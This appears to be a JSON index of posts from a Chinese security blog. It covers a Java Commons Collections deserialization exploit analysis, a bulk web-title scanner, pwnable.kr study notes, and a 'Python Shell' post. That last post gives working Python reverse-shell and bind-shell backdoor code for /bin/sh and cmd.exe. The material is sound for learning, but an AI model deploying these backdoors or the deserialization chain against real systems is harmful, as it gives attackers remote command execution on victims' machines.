[{"title":"JAVA反序列化分析之Apache-Commons-Collections","url":"/2019/07/17/JAVA反序列化分析之Apache-Commons-Collections/","content":"\n## Transformer\n\n该类里的transform方法将一个对象转化为另一个对象.如Runtime.class经过transform转化输出结果为class java.lang.Class\n\n![Pasted Graphi](/img/media/Apache-Commons-Collections/Pasted%20Graphic.png)\n\n## InvokerTransformer\n\n通过查看InvokerTransformer的源码可以看出该类是通过反射创建一个新的对象实例.该类使用了transform接口如图所示：\n![Pasted Graphic 1](/img/media/Apache-Commons-Collections/Pasted%20Graphic%201.png)\n\ncls获取传递进来的input对象值，例如传入runtime对象\n\ncls.getMethod   以及method.invoke是利用java反射机制反射Runtime的getRuntime方法。\n\niMethodName表示得到的方法名， iParamTypes表示方法中使用的参数类型的数组\n![Pasted Graphic 2](/img/media/Apache-Commons-Collections/Pasted%20Graphic%202.png)\n\n通过InvokerTransformer反射出了java.lang.Runtime.getRuntime()\n![Pasted Graphic 3](/img/media/Apache-Commons-Collections/Pasted%20Graphic%203.png)\n\n执行命令的整个调用连为 java.lang.Runtime..getRuntime().invoke().exec()\n可以通过该方式逐步调用：\n![Pasted Graphic 4](/img/media/Apache-Commons-Collections/Pasted%20Graphic%204.png)\n\n成功代码执行\n![Pasted Graphic 5](/img/media/Apache-Commons-Collections/Pasted%20Graphic%205.png)\n\n上述是整个反射链的过程\n\n## ChainedTransformer\n![Pasted Graphic 6](/img/media/Apache-Commons-Collections/Pasted%20Graphic%206.png)\n\n可以看出该类重构了transform方法，将我们之前的调用链简化到一个方法中通过创建的Transformers数组循环反射执行。\n\n如何构造出Runtime对象类型呢？\n\n## ConstantTransformer\n![Pasted Graphic 7](/img/media/Apache-Commons-Collections/Pasted%20Graphic%207.png)\n\n可以看出该类对transformer重构，返回一个iConstant变量，该变量在ConstantTransformer(Object)方法中被赋值。\n![Pasted Graphic 8](/img/media/Apache-Commons-Collections/Pasted%20Graphic%208.png)\n![Pasted Graphic 9](/img/media/Apache-Commons-Collections/Pasted%20Graphic%209.png)\n\n内部构造出了Runtime的对象类型\n\n构造poc\n![Pasted Graphic 10](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2010.png)\n\n成功执行\n![Pasted Graphic 11](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2011.png)\n\n## TransformedMap\n\n该类实现了一个功能——将普通的Map转换为一个TransformedMap，可以通过该类绕过transform方法。\n![Pasted Graphic 12](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2012.png)\n\nKeyTransfomer 表示key改变的操作  valueTransformer表示value改变时的操作\n![Pasted Graphic 13](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2013.png)\n\n从这里可以看出 value是可控的，在decorate中赋值即可，于是有如下利用代码：\n![Pasted Graphic 14](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2014.png)\n\n通过TransformedMap代替transform生成如下代码：\n![Pasted Graphic 15](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2015.png)\n\n成功弹出计算器：\n![Pasted Graphic 16](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2016.png)\n\n至此我们获取了一个完整的poc，剩下需要找一个可重写readObject方法的类并且调用了对map值进行修改操作。\n\n在ysoserial反序列化工具利用的是 BadAttributeValueExpException 查看代码如下：\n![Pasted Graphic 19](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2019.png)\n\n该代码重构了readObject方法，如果传入类型为map类型，则会调用map.toString()方法。这里并没有对map的key值进行修改操作，于是需要利用LazyMap,TiedMapEntry两个类来构造\nLazyMap：尝试访问key的value如果key不在会把值put进去\n![Pasted Graphic 20](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2020.png)\n\nTiedMapEntry：会把map和一个key进行绑定\n![Pasted Graphic 21](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2021.png)\n\n利用LazyMap创建map对象，通过decotate方法设transfomer时的transformChain然后通过TiedMapEntry将map与不存在的key绑定，进而利用BadAttributeValueExpException创建一个map进行赋值。但是val是私有属性的，需要进行setAccessible(true)来访问私有变量。\n\n至此完成整个exp编写：\n![Pasted Graphic 22](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2022.png)\n\n## 参考链接\n\nhttps://security.tencent.com/index.php/blog/msg/97\n\nhttps://www.freebuf.com/news/150872.html\n\nhttp://pupiles.com/java_unserialize2.html","tags":["JAVA"]},{"title":"Title批量获取工具","url":"/2019/04/20/Title批量获取工具/","content":"\n## 批量快速获取Title、server信息工具\n\n使用方法：将需要获取的网站链接列表保存在工具目录下的1.txt中，运行脚本。此脚本会时时输出在控制台中，运行完毕后所有信息全部输入到本地生成的output.xls文件中。如果有建议可以评论提交本人修改。\n\n```\n'''\ntitle快速获取工具  \n保存需要获取的ip到本地txt文件直接运行即可\n'''\nimport requests\nimport threading\nimport re, xlwt, random\n\n#proxies = {'http': 'http://127.0.0.1:8080'}\nThreadList = []   # 线程列表\nrunList = []      # 运行线程列表\nFileList = []     # 网站链接列表\nOutList = []      # 输出数据列表\nlock = threading.Lock()\n\n# 随机agent\ndef requests_headers():\n    user_agent = [\n        'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',\n        'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',\n        'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5'\n    ]\n    UA = random.choice(user_agent)\n    headers = {\n        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        'User-Agent':UA,\n        'Upgrade-Insecure-Requests':'1',\n        'Connection':'keep-alive',\n        'Cache-Control':'max-age=0',\n        'Accept-Encoding':'gzip, deflate, sdch',\n        'Accept-Language':'zh-CN,zh;q=0.8',\n        \"Referer\": \"http://www.baidu.com/link?url=www.so.com&url=www.soso.com&&url=www.sogou.com\"\n    }\n    return headers\n\n# 多线程获取页面信息\nclass MyThread(threading.Thread):\n    def __init__(self, ip):\n        threading.Thread.__init__(self)\n        self.ip = ip\n\n    def run(self):\n        if self.ip[0:4] != 'http':\n            self.ip = 'http://' + self.ip\n        try:\n            headers = requests_headers()\n            r = requests.get(url=self.ip, headers=headers ,timeout=5, proxies=False)\n            if r.text.find('charset=utf-8') >= 0:\n                r.encoding = 'utf-8'\n            title = re.findall(r'<title>(.*?)</title>', r.text)[0]\n            lock.acquire(timeout=1)\n            print([self.ip,title,r.headers['Server']])\n            OutList.append([self.ip, title ,r.headers['Server']])\n            lock.release()       \n        except:\n            pass\n\n\ndef OpenFile():\n    f = open('1.txt','r')\n    for i in f.readlines():\n        FileList.append(i.strip())\n    f.close()\n    GetInfo(FileList)\n\ndef GetInfo(FileList):\n    taskNum = 0\n    for i in FileList:\n        t = MyThread(i)\n        ThreadList.append(t)\n    for t in ThreadList:\n        t.setDaemon(True)\n        t.start()\n        runList.append(t)\n        taskNum += 1\n        while taskNum > 19:\n            for t in runList:\n                if t.isAlive() == False:\n                    runList.remove(t)\n                    taskNum -= 1\n    OutPut(OutList)\n\ndef OutPut(OutList):\n    workbook = xlwt.Workbook(encoding='utf-8')\n    worksheet = workbook.add_sheet('result')\n    for i in range(0,3):\n        worksheet.col(i).width = 10000\n    worksheet.write(0,0, label='网站链接')\n    worksheet.write(0,1, label='网站标题')\n    worksheet.write(0,2, label='Server信息')\n    #worksheet.write(0,3, label='Web指纹')\n    for i in range(1,len(OutList)):\n        output = OutList[i]\n        worksheet.write(i,0, label=output[0])\n        worksheet.write(i,1, label=output[1])\n        worksheet.write(i,2, label=output[2])\n    workbook.save('output.xls')\n\ndef main():\n    OpenFile()\n\nif \"__main__\" == __name__:\n    main()\n\n```","tags":["安全工具"]},{"title":"pwable.rk题目相关知识(不定期更新)","url":"/2019/04/01/pwable-rk题目相关知识不定期更新/","content":"\n## Fd\n\n1、标准输入输出和错误\n\nlinux下使用标准输入文件stdin和标准输出文件stdout，来表示每个命令的输入和输出，还使用标准错误输出文件stderr用于输出错误信息。三个标准流都与系统与控制终端设备相连(如:键盘)。\n\n因此，在标准情况下，每个命令通常从相应的控制终端中获取输入，并将输出打印到控制终端屏幕上，如本题解题过程。也可以将程序重新定义，将stdin，stdout重定向。最基本的使用方法是定义到一个文件上，从一个文件获取输入，输出到另外的文件中。如read()，write()函数的使用。\n\n2、文件描述符\n\n在底层操作系统是不会通过文件指针来查找文件的，而是通过文件表示符来操作的。\n\n文件标识符以一系列证书，从0开始依次递增。但是一般系统标识符都是从3开始的。\n\n文件描述符0、1、2和终端相关。如果希望命令从文件中读取输入或输出到文件中，就需要使用文件重定向。\n\n系统默认打开三个流：\n\n| 文件描述符| 缩写 | 描述 |\n| :-: | :-: | :-: |\n| 0 | stdin | 标准输入(命令的输入，缺省和终端键盘关联) |\n| 1 | stdout | 标准输出(命令的输出，缺省和终端屏幕关联) |\n| 2 | stderr | 标准错误输出(命令的错误信息输出，缺省和终端屏幕关联) |\n\n3、重定向标准输出\n\n```\nwhoami > filename  #把命令标准输出重定向到一个文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令标准输出重定向到文件中(尾部追加)\n```\n\n4、重定向标准输入\n\n```\nwhoami < filename  # 以filename文件作为命令whoami的标准输入\nwhoami << DELIMITER # 从标准输入中读入输入，直到遇到DELIMITER分解符\n```\n\n5、重定向标准错误\n\n```\nwhoami 2> filename # 把whoami命令的标准错误重定向到文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令的标准错误重定向到文件中(尾部追加)\n```\n\n## collision\n\n1、\\xc9 为字符串。使用python print后会输出？是因为计算机不识别的这个字符\n\n2、大端序 or 小端序\n    端序：又称字节序、尾序、位序。在计算机领域是指机器存放多字节数据的字节顺序。在涉及到低层数据存储和网络数据传输研究中都会涉及端序。\n    大端序：高位字节放在内存的低地址，低位字节放在内存的高地址。\n    小端序：低位字节放在内存的低地址，高位字节放在内存的高地址。\n    例：int a = 0x12345678  从左到右字节位降低 两个数为一个字节 12是高位78是低位，字节位具有相对性。\n```\n    大端序存放方式：\n    0x00000001           -- 12\n    0x00000002           -- 34\n    0x00000003           -- 56\n    0x00000004           -- 78 \n    地址位从低到高，字节位从高到低\n    小端序存放方式：\n    0x00000001           -- 78\n    0x00000002           -- 56\n    0x00000003           -- 34\n    0x00000004           -- 12 \n    地址位从低到高，字节位从低到高\n```\n\n3、lsb文件基本都是小端序文件\n\n## bof\n\n1、gets(s)存在溢出\n    scanf遇到输出不能有空格，所以用gets输入字符串，但是gets出现了一个潜在问题，gets将不停地往s中塞东西，不管s的可用空间是否足够，就存在溢出漏洞问题，超过s空间长度会导致系统崩溃。\n\n2、esp汇编中为栈顶置针，栈中数据都是从栈顶进入的。\n\n| 栈顶 |\n| --- |\n| esp |\n| ... |\n| s |\n| ... |\n| ebp |\n| 返回地址 |\n| arg0 | \n\nesp = s + ebp(4字节) + 返回地址(4)\n\n\n## flag\n\nupx压缩文件\n```\nupx -d file  #upx解压文件\n```\n\n## passcode\n\n1、scanf(\"%d\", &a)\nscanf函数会把获取的值送到一个地址，如果不加&会把a的值当作地址传送。\n\n\n待更新...\n","tags":["pwn"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n1. windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n2. linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]}]